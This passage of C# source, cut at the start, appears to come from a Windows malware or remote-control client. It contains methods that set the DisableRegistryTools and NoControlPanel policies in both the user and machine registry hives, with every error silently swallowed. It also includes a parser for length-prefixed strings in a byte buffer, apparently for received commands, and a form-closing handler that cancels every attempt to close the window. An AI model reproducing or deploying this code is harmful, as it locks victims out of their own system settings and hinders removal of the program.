                Microsoft.Win32.RegistryKey regkey = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                regkey.SetValue("DisableRegistryTools", true, Microsoft.Win32.RegistryValueKind.DWord);
                regkey.Close();
            }
            catch
            {

            }

            try
            {
                Microsoft.Win32.RegistryKey regkey = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                regkey.SetValue("DisableRegistryTools", true, Microsoft.Win32.RegistryValueKind.DWord);
                regkey.Close();
            }
            catch
            {

            }
        }
        else
        {
            try
            {
                Microsoft.Win32.RegistryKey regkey = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                regkey.SetValue("DisableRegistryTools", false, Microsoft.Win32.RegistryValueKind.DWord);
                regkey.Close();
            }
            catch
            {

            }

            try
            {
                Microsoft.Win32.RegistryKey regkey = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                regkey.SetValue("DisableRegistryTools", false, Microsoft.Win32.RegistryValueKind.DWord);
                regkey.Close();
            }
            catch
            {

            }
        }
    }

    public void SetAntiControlPanel(bool enable)
    {
        if (enable)
        {
            try
            {
                Microsoft.Win32.RegistryKey regkey = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                regkey.SetValue("NoControlPanel", true, Microsoft.Win32.RegistryValueKind.DWord);
                regkey.Close();
            }
            catch
            {

            }

            try
            {
                Microsoft.Win32.RegistryKey regkey = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                regkey.SetValue("NoControlPanel", true, Microsoft.Win32.RegistryValueKind.DWord);
                regkey.Close();
            }
            catch
            {

            }
        }
        else
        {
            try
            {
                Microsoft.Win32.RegistryKey regkey = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                regkey.SetValue("NoControlPanel", false, Microsoft.Win32.RegistryValueKind.DWord);
                regkey.Close();
            }
            catch
            {

            }

            try
            {
                Microsoft.Win32.RegistryKey regkey = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                regkey.SetValue("NoControlPanel", false, Microsoft.Win32.RegistryValueKind.DWord);
                regkey.Close();
            }
            catch
            {

            }
        }
    }

    public string ReadString(ref byte[] bytes)
    {
        int length = BitConverter.ToInt32(bytes.Take(4).ToArray(), 0);
        bytes = bytes.Skip(4).ToArray();

        string value = Encoding.UTF8.GetString(bytes.Take(length).ToArray());
        bytes = bytes.Skip(length).ToArray();

        return value;
    }

    private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
    {
        e.Cancel = true;
    }
}